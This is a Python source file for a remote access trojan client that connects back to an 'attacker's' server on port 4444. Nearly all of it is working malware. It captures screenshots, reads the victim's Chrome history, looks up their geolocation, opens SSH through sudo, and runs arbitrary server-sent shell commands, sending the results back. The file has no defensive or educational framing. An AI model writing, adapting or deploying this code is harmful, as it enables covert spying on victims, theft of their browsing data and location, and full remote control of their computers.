import socket
import subprocess
import os
import pyautogui
import io
import shutil
import sqlite3
import requests

# Define the attacker's IP address directly
SERVER_IP = '192.168.0.27'  # Replace with the actual IP address of the attacker
PORT = 4444

def capture_screen():
    screenshot = pyautogui.screenshot()
    img_bytes = io.BytesIO()
    screenshot.save(img_bytes, format='PNG')
    return img_bytes.getvalue()

def get_chrome_history():
    try:
        path = os.getenv("USERPROFILE") + r"\AppData\Local\Google\Chrome\User Data\Default\History"
        temp_copy = "temp_history"
        shutil.copy2(path, temp_copy)

        connection = sqlite3.connect(temp_copy)
        cursor = connection.cursor()
        cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 20")
        results = cursor.fetchall()
        connection.close()
        os.remove(temp_copy)

        history = ""
        for url, title in results:
            history += f"{title} - {url}\n"
        return history.encode()
    except Exception as e:
        return f"[!] Error getting history: {str(e)}".encode()

def get_location():
    try:
        response = requests.get("https://ipinfo.io/json")
        if response.status_code == 200:
            info = response.json()
            loc = info.get("loc", "Unknown").split(",")
            city = info.get("city", "Unknown")
            region = info.get("region", "Unknown")
            country = info.get("country", "Unknown")
            ip = info.get("ip", "Unknown")
            return f"IP: {ip}\nLocation: {city}, {region}, {country}\nCoordinates: {loc[0]}, {loc[1]}".encode()
        else:
            return b"[!] Failed to get location info."
    except Exception as e:
        return f"[!] Error: {str(e)}".encode()

def open_ssh_port():
    try:
        subprocess.run("sudo ufw allow 22/tcp", shell=True, check=True)
        subprocess.run("sudo systemctl enable ssh", shell=True, check=True)
        subprocess.run("sudo systemctl start ssh", shell=True, check=True)
        return "SSH port opened and SSH service started.".encode()
    except Exception as e:
        return f"[!] Error opening SSH port: {str(e)}".encode()

def send_with_length(sock, data):
    sock.sendall(len(data).to_bytes(8, 'big'))
    sock.sendall(data)

def connect_to_server(server_ip=SERVER_IP, port=PORT):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((server_ip, port))

    while True:
        command = client.recv(1024).decode().strip()
        if command == 'exit':
            break
        elif command == 'screenshot':
            data = capture_screen()
            send_with_length(client, data)
        elif command == 'history':
            data = get_chrome_history()
            send_with_length(client, data)
        elif command == 'location':
            data = get_location()
            send_with_length(client, data)
        elif command == 'open_ssh':
            data = open_ssh_port()
            send_with_length(client, data)
        else:
            try:
                output = subprocess.getoutput(command)
                client.send(output.encode())
            except Exception as e:
                client.send(f"Error: {str(e)}".encode())

    client.close()

if __name__ == "__main__":
    connect_to_server()  # Connects to the attacker's server
